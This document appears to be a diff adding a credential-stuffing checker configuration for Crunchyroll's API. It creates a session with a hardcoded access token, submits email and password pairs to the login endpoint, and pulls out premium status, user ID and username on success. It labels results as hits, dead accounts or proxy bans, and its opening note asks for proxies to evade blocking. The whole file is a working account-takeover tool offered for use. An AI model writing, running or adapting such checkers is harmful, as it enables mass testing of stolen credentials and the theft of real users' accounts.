@@ -1,0 +1,21 @@
+# Note: Need Acceptable Proxies
+BLOCK=SET|VAR=GUID|VALUE=RND(LENGTH>8, CHARS>0123456789abcdefghijklmnopqrstuvwxyz)-RND(LENGTH>4, CHARS>0123456789abcdefghijklmnopqrstuvwxyz)-RND(LENGTH>4, CHARS>0123456789abcdefghijklmnopqrstuvwxyz)-RND(LENGTH>4, CHARS>0123456789abcdefghijklmnopqrstuvwxyz)-RND(LENGTH>18, CHARS>0123456789abcdefghijklmnopqrstuvwxyz)
+BLOCK=REQUEST-1|URL=https://api.crunchyroll.com/start_session.0.json|TYPE=POST|CONTENT=device_type=com.crunchyroll.windows.desktop&device_id=<GUID>&access_token=LNDJgOit5yaRIWN|HEADERS={"Content-Type":"application/x-www-form-urlencoded","Content-Length":"119","Host":"api.crunchyroll.com","Connection":"Keep-Alive"}
+BLOCK=FIND-1|VAR=<REQUEST-1.cookies>|FIRST=session_id=|LAST= for
+BLOCK=FIND-2|VAR=<REQUEST-1.cookies>|FIRST=__cf_bm=|LAST= for
+BLOCK=FIND-3|VAR=<REQUEST-1.cookies>|FIRST=__cfruid=|LAST= for
+BLOCK=REQUEST-2|URL=https://api.crunchyroll.com/list_series.0.json|TYPE=POST|CONTENT=media_type=anime&filter=popular&offset=0&limit=20&fields=series.series_id%2Cseries.etp_guid%2Cseries.name%2Cseries.description%2Cseries.portrait_image%2Cseries.in_queue%2Cseries.premium_only%2Cseries.media_count%2Cseries.collection_count&session_id=<FIND-1>&locale=esES&version=1.3.1.0&connectivity_type=unknown|HEADERS={"Content-Type":"application/x-www-form-urlencoded","Content-Length":"335","Host":"api.crunchyroll.com","Connection":"Keep-Alive","Cache-Control":"no-cache"}
+BLOCK=FIND-4|VAR=<REQUEST-2.cookies>|FIRST=bucket=|LAST= for
+BLOCK=SET|VAR=TR5|VALUE=LENGTH(VAR>account=<EMAIL>&password=<PASSWORD>&session_id=<FIND-1>&locale=esES&version=1.3.1.0&connectivity_type=ethernet)
+BLOCK=REQUEST-3|URL=https://api.crunchyroll.com/login.0.json|TYPE=POST|CONTENT=account=<EMAIL>&password=<PASSWORD>&session_id=<FIND-1>&locale=esES&version=1.3.1.0&connectivity_type=ethernet|HEADERS={"Content-Type":"application/x-www-form-urlencoded","Host":"api.crunchyroll.com","Content-Length":"<TR5>","Connection":"Keep-Alive","Cache-Control":"no-cache"}
+BLOCK=FIND-5|VAR=<REQUEST-3.text>|FIRST=premium":"|LAST="
+BLOCK=FIND-6|VAR=<REQUEST-3.text>|FIRST=user_id":"|LAST="
+BLOCK=FIND-7|VAR=<REQUEST-3.text>|FIRST=username":"|LAST="
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=incorrecta|CATEGORY=DEAD|RETURN=incorrecta
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=username|CATEGORY=HIT|RETURN=SUCCESS - Premium: <FIND-5> - USER_ID: <FIND-6> - USERNAME: <FIND-7>
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=1005|CATEGORY=BAN|RETURN=Proxy Banned
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=sistema|CATEGORY=BAN|RETURN=Proxy Banned
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=Just a moment|CATEGORY=BAN|RETURN=Proxy Banned
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=Unauthenticated|CATEGORY=BAN|RETURN=Proxy Banned
+BLOCK=RESULT|VAR=<REQUEST-3.text>|VALUE=Access denied|CATEGORY=BAN|RETURN=Proxy Banned
+BLOCK=RESULT|VAR=<REQUEST-3.text>|CATEGORY=TOCHECK|RETURN=<REQUEST-3.text>
